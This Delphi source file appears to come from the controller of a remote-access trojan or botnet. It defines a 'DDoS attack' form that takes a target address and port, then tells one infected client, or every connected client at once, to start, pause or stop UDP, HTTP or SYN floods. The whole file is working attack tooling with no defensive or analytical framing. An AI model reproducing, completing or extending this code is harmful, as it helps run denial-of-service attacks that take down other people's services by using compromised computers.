unit UnitDdosAttack;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ExtCtrls, Spin, UnitMain, UnitConnection, IniFiles;

type
  TFormDdosAttack = class(TForm)
    lbl17: TLabel;
    sePort: TSpinEdit;
    lbl1: TLabel;
    edtTarget: TEdit;
    rg1: TRadioGroup;
    btn1: TButton;
    btn2: TButton;
    grp1: TGroupBox;
    chk1: TCheckBox;
    procedure btn1Click(Sender: TObject);
    procedure btn2Click(Sender: TObject);
    procedure rg1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    Client: PConnectionDatas;
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
  end;

var
  FormDdosAttack: TFormDdosAttack;

implementation

uses
  UnitConstants;

{$R *.dfm}
     
constructor TFormDdosAttack.Create(aOwner: TComponent; ConnDatas: PConnectionDatas);
begin
  inherited Create(aOwner);
  Client := ConnDatas;
end;

procedure TFormDdosAttack.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;

procedure TFormDdosAttack.btn1Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  i: Integer;
begin
  if (btn1.Caption = 'Start') or (btn1.Caption = 'Start') then
  begin
    if edtTarget.Text = '' then Exit;
    btn1.Caption := 'Pause';
    rg1.Enabled := False;

    case rg1.ItemIndex of
      0:  begin
            if chk1.Checked = True then
            begin
              for i := 0 to ConnectionList.Count - 1 do
              begin
                ConnDatas := PConnectionDatas(ConnectionList[i]);
                if ConnDatas.Items = nil then Exit;
                SendDatas(ConnDatas.AThread, FLOODUDPSTART + '|' +
                          edtTarget.Text + '|' + sePort.Text);
              end;
            end
            else SendDatas(Client.AThread, FLOODUDPSTART + '|' +
                           edtTarget.Text + '|' + sePort.Text);
          end;
      1:  begin
            if chk1.Checked = True then
            begin
              for i := 0 to ConnectionList.Count - 1 do
              begin
                ConnDatas := PConnectionDatas(ConnectionList[i]);
                if ConnDatas.Items = nil then Exit;
                SendDatas(ConnDatas.AThread, FLOODHTTPSTART + '|' + edtTarget.Text);
              end;
            end
            else SendDatas(Client.AThread, FLOODHTTPSTART + '|' + edtTarget.Text);
          end;
      2:  begin
            if chk1.Checked = True then
            begin
              for i:=0 to ConnectionList.Count-1 do
              begin
                ConnDatas := PConnectionDatas(ConnectionList[i]);
                if ConnDatas.Items = nil then Exit;
                SendDatas(ConnDatas.AThread, FLOODSYNSTART + '|' +
                          edtTarget.Text + '|' + sePort.Text);
              end;
            end
            else SendDatas(Client.AThread, FLOODSYNSTART + '|' +
                           edtTarget.Text + '|' + sePort.Text);
          end;
    end;
  end
  else
  begin
    btn1.Caption := 'Resume';

    case rg1.ItemIndex of
      0:  begin
            if chk1.Checked = True then
            begin
              for i := 0 to ConnectionList.Count - 1 do
              begin
                ConnDatas := PConnectionDatas(ConnectionList[i]);
                if ConnDatas.Items = nil then Exit;
                SendDatas(ConnDatas.AThread, FLOODUDPSTOP + '|Y');
              end;
            end
            else SendDatas(Client.AThread, FLOODUDPSTOP + '|Y');
          end;
      1:  begin
            if chk1.Checked = True then
            begin
              for i := 0 to ConnectionList.Count - 1 do
              begin
                ConnDatas := PConnectionDatas(ConnectionList[i]);
                if ConnDatas.Items = nil then Exit;
                SendDatas(ConnDatas.AThread, FLOODHTTPSTOP + '|Y');
              end;
            end
            else SendDatas(Client.AThread, FLOODHTTPSTOP + '|Y');
          end;
      2:  begin
            if chk1.Checked = True then
            begin
              for i:=0 to ConnectionList.Count-1 do
              begin
                ConnDatas := PConnectionDatas(ConnectionList[i]);
                if ConnDatas.Items = nil then Exit;
                SendDatas(ConnDatas.AThread, FLOODSYNSTOP + '|Y');
              end;
            end
            else SendDatas(Client.AThread, FLOODSYNSTOP + '|Y');
          end;
    end;

    rg1.Enabled := True;
  end;
end;

procedure TFormDdosAttack.btn2Click(Sender: TObject);
var
  ConnDatas: PConnectionDatas;
  i: Integer;
begin
  if btn1.Caption = 'Start' then Exit;

  case rg1.ItemIndex of
    0:  begin
          if chk1.Checked = True then
          begin
            for i := 0 to ConnectionList.Count - 1 do
            begin
              ConnDatas := PConnectionDatas(ConnectionList[i]);
              if ConnDatas.Items = nil then Exit;
              SendDatas(ConnDatas.AThread, FLOODUDPSTOP + '|N');
            end;
          end
          else SendDatas(Client.AThread, FLOODUDPSTOP + '|N');
        end;
    1:  begin
          if chk1.Checked = True then
          begin
            for i := 0 to ConnectionList.Count - 1 do
            begin
              ConnDatas := PConnectionDatas(ConnectionList[i]);
              if ConnDatas.Items = nil then Exit;
              SendDatas(ConnDatas.AThread, FLOODHTTPSTOP + '|N');
            end;
          end
          else SendDatas(Client.AThread, FLOODHTTPSTOP + '|N');
        end;
    2:  begin
          if chk1.Checked = True then
          begin
            for i:=0 to ConnectionList.Count-1 do
            begin
              ConnDatas := PConnectionDatas(ConnectionList[i]);
              if ConnDatas.Items = nil then Exit;
              SendDatas(ConnDatas.AThread, FLOODSYNSTOP + '|N');
            end;
          end
          else SendDatas(Client.AThread, FLOODSYNSTOP + '|N');
        end;
  end;

  rg1.Enabled := True;
  btn1.Caption := 'Start';
end;

procedure TFormDdosAttack.rg1Click(Sender: TObject);
begin
  if rg1.ItemIndex = 1 then
  begin
    sePort.Value := 80;
    sePort.Enabled := False;
  end
  else sePort.Enabled := True;
end;

procedure TFormDdosAttack.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  IniFile: TIniFile;
  TmpStr: string;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  IniFile.WriteInteger('Ddos attack', 'Left', Left);
  IniFile.WriteInteger('Ddos attack', 'Top', Top);  
  IniFile.WriteInteger('Ddos attack', 'Width', Width);
  IniFile.WriteInteger('Ddos attack', 'Height', Height);
  IniFile.WriteBool('Ddos attack', 'All clients', chk1.Checked);
  IniFile.Free;
end;

procedure TFormDdosAttack.FormCreate(Sender: TObject);
var
  TmpStr: string;
  IniFile: TIniFile;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  Left := IniFile.ReadInteger('Ddos attack', 'Left', 283);
  Top := IniFile.ReadInteger('Ddos attack', 'Top', 144);
  Width := IniFile.ReadInteger('Ddos attack', 'Width', 564);
  Height := IniFile.ReadInteger('Ddos attack', 'Height', 324);
  chk1.Checked := IniFile.ReadBool('Ddos attack', 'All clients', True);
  IniFile.Free;
end;

procedure TFormDdosAttack.FormShow(Sender: TObject);
begin
  chk1.Caption := 'Send command to all client (' + IntToStr(ConnectionList.Count) + ')';
end;

end.
